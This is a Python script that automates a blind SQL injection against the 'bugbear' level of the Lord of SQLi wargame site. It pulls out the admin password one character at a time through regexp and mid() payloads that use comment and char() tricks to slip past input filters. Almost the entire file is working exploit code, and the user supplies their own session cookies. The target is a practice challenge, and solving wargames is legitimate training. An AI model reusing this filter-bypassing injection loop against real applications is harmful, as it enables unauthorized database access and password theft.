import urllib.parse
import http.client

HTTP=http.client.HTTPConnection("los.eagle-jump.org")
Url="/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no="
Headers={"Cookie":"__cfduid=[your Own cfduid]; PHPSESSID=[your Own PHPSESSID]"} #check your own cookie then insert the correct value to make connection success, or you will get nothing return.
Passwd=""

pwNotInChar = False
for i in range(len(Passwd)+1,100):
    for c in "0123456789abcdefghijklmnopqrstuvwxyz+":

        Payload="1/**/||/**/id/**/regexp/**/concat(char(97),char(100),char(109),char(105),char(110))/**/&&/**/mid(pw,"+str(i)+",1)/**/regexp/**/"+str(bin(ord(c)))

        HTTP.request("GET",Url+urllib.parse.quote(Payload),"",Headers)

        print (Payload)
                
        if (b"Hello admin" in HTTP.getresponse().read()):
            Passwd+=c
            print ("[+] Found: %c" % c)

            HTTP.request("GET",Url+urllib.parse.quote(Passwd),"",Headers)
        if (str(c) == "+"):
            pwNotInChar = True
            break
    if(pwNotInChar == True):
        break
    
print ("[!] Not Found")
print ("[*] Password: %s" % Passwd)